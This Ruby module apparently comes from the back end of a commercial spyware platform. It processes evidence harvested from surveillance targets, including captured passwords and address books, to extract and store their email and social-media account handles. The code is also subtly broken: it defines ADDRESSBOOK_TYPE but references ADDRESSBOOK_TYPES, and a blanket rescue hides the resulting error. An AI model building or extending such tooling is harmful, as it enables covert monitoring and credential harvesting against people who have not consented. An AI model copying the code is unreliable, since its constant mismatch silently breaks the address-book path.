#
#  Module for retrieving the accounts of the targets
#

require 'mail'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Accounts
  include Tracer
  extend Tracer

  class << self

    ADDRESSBOOK_TYPE = [:facebook, :twitter, :gmail, :skype, :bbm, :whatsapp, :phone, :mail, :linkedin]

    def retrieve
      count = ::Item.targets.count
      trace :debug, "Retrieving accounts for #{count} targets"

      ::Item.targets.each do |target|

        # retrieve the entity of this target
        entity = ::Entity.targets.also_in(path: [target[:_id]]).first

        # skip if there's nothing new to analyze
        next if entity[:analyzed]['handles']

        trace :info, "Analyzing entity #{entity.name} for new handles"

        last = entity[:analyzed]['handles_last']

        # passwords parsing
        # here we extract every account that seems an email address
        Evidence.collection_class(target[:_id]).where({type: 'password', :da.gt => last}).each do |ev|
          add_handle(entity, ev[:data])
          last = ev.da if ev.da > last
        end

        # addressbook
        # here we extract every account marked as "local" by the addressbook module
        Evidence.collection_class(target[:_id]).where({type: 'addressbook', 'data.type' => :target, :da.gt => last}).each do |ev|
          add_handle(entity, ev[:data])
          last = ev.da if ev.da > last
        end

        # mark it as analyzed
        entity[:analyzed] = {'handles' => true, 'handles_last' => last}
        entity.save
      end

    end

    def add_handle(entity, data)

      trace :debug, "Parsing handle data: #{data.inspect}"

      # target account in the contacts (addressbook)
      if ADDRESSBOOK_TYPES.include? data['program']
        unless data['info'].length == 0
          type = data['program']
          name = data['info']
          name = name.split(':')[1].chomp.strip if name[":"]
          create_entity_handle(entity, :automatic, type, name)
        end
      elsif data['program'] =~ /outlook|mail/i
        # mail accounts from email clients saving account to the device
        name = data['user']
        add_domain(name, data['service'])
        create_entity_handle(entity, :automatic, :mail, name) if is_mail?(name)
      end

      # infer on the user to discover email addresses
      if data['user']
        name = data['user']
        add_domain(name, data['service'])
        create_entity_handle(entity, :automatic, :mail, name) if is_mail?(name)
      end
    rescue Exception => e
      trace :error, "Cannot add handle: " + e.message
      trace :fatal, e.backtrace.join("\n")
    end

    def create_entity_handle(entity, level, type, name)
      # don't add if already exist
      return if entity.handles.where({type: type, name: name}).count != 0

      trace :info, "Adding handle [#{type} #{name}] to entity: #{entity.name}"

      # add to the list of handles
      entity.handles.create!(level: :automatic, type: type, name: name)
    end

    def is_mail?(value)
      return false if value == ''
      parsed = Mail::Address.new(value)
      return parsed.address == value && parsed.local != parsed.address
    rescue Mail::Field::ParseError
      return false
    end

    def add_domain(user, service)
      user << '@gmail.com' if service =~ /gmail|google/i and not is_mail?(user)
      user << '@hotmail.com' if service =~ /hotmail/i and not is_mail?(user)
    end

  end

end

end
end

